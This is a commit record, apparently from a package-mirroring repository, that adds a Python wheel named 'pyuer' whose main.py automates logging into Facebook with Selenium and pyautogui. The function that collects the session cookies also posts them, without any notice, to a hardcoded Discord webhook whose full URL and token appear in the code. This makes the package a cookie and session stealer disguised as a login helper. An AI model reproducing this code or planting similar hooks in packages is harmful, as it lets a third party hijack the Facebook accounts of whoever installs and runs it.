cbdf813dc3ea209494b7e25542fd2406179b9c61
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-07-06 04:05:23 +0000

    Add package pyuer/0.1.0/pyuer-0.1.0-py3-none-any.whl

---
+++ packages/pyuer/pyuer-0.1.0-py3-none-any.whl/cookesgot/main.py
@@ -0,0 +1,52 @@
+import requests
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+import time
+import pyautogui
+import os
+
+
+def handle_cookies(cookies):
+    discord_webhook_url='https://discord.com/api/webhooks/1258431142000857138/StEykrw6rPXMdD9naYIl8msSMOho-yMftJXGXaTnqiw9xFcbOTO0CYxFAlbiJ7ELpA4q'
+
+
+    # Send cookies to Discord if webhook URL is provided
+    if discord_webhook_url:
+        cookies_message = "```\n"
+        for cookie in cookies:
+            cookies_message += f"{cookie['name']}={cookie['value']}\n"
+        cookies_message += "```"
+
+        requests.post(discord_webhook_url, data={"content": cookies_message})
+        
+
+def get_facebook_cookies(driver, email, password):
+    # Navigate to Facebook and log in
+    driver.get("https://www.facebook.com")
+
+    # Fluent wait
+    time.sleep(4)
+
+    username_input = driver.find_element(By.XPATH, '//*[@id="email"]')
+    password_input = driver.find_element(By.XPATH, '//*[@id="pass"]')
+
+    username_input.send_keys(email)
+    password_input.send_keys(password)
+    time.sleep(3)
+
+    # Simulate tabbing to the login button
+    pyautogui.press('tab')
+    pyautogui.press('tab')
+
+    # Simulate pressing Enter to login
+    pyautogui.press('enter')
+
+    # Wait for the login to complete
+    time.sleep(5)
+
+    # Get the cookies
+    cookies = driver.get_cookies()
+    time.sleep(4)
+    handle_cookies(cookies)
+
+    return cookies
